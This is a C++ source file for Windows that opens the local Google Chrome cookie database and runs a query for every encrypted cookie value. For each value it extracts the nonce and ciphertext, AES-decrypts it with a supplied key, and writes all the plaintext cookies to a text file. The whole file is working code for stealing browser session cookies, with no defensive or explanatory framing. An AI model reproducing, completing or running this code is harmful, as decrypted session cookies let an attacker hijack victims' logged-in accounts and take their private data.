//cpp
#include <vector>
#include <string>
#include <iostream>
#include <fstream>

//win
#include <windows.h>
#include <shlobj.h>
#include <tchar.h>

//crypto
#include"3rdparts/cryptopp/filters.h"
#include"3rdparts/cryptopp/hex.h"

//sqlite
#include <SQLiteCpp/SQLiteCpp.h>

#include"appdata/appdata.h"
#include "crypto/crypto.h"
using namespace std;
using namespace CryptoPP;
using namespace ChromeWin;
bool decryptCipher(vector<unsigned char>& key) {

	CHAR path[MAX_PATH] = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies.db";
	TCHAR buffer[MAX_PATH];
	if (SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buffer) == S_OK)
	{
		strcat_s((char*)buffer, MAX_PATH, path);
		strcpy_s(path, MAX_PATH, (const char*)buffer);
	}
	
	SQLite::Database db(path, SQLite::OPEN_READONLY);
	SQLite::Statement query(db, "SELECT encrypted_value FROM cookies");
	ofstream fn_file("decrypted_value.txt");
	string DecryptedValue;
	string EncryptedValue;
	const void* encode_value;
	int valuesize;
	string iv;
	string cipher;
	string Encoded, Decoded;
	while (query.executeStep()) {
		//initialize
		DecryptedValue.clear();
		EncryptedValue.clear();
		encode_value = nullptr;
		valuesize = 0;
		iv.clear();
		cipher.clear();
		encode_value = query.getColumn(0).getBlob();
		valuesize = query.getColumn(0).getBytes();
		//

		StringSource((byte*)encode_value, valuesize, true, new HexEncoder(new StringSink(EncryptedValue)));


		if (valuesize < 30) continue;
		//处理Nonce
		StringSource(EncryptedValue, true, new HexDecoder(new StringSink(Decoded)));
		EncryptedValue = Decoded;
		Decoded.clear();

		iv = EncryptedValue.substr(VersionLength, NonceLength + 3);

		StringSource(iv, true, new HexEncoder(new StringSink(Encoded)));
		iv = Encoded;
		Encoded.clear();
		iv = iv.substr(0, iv.size() - 6);

		StringSource(EncryptedValue, true, new HexEncoder(new StringSink(Encoded)));
		EncryptedValue = Encoded;
		Encoded.clear();

		cipher = EncryptedValue.substr(VersionLength * 2 + NonceLength * 2);

		//AES
		AES_Decrypt(iv, cipher, key, DecryptedValue);

		//写入文件
		fn_file << DecryptedValue;
		fn_file << endl;

	}
	fn_file.close();
	return true;
}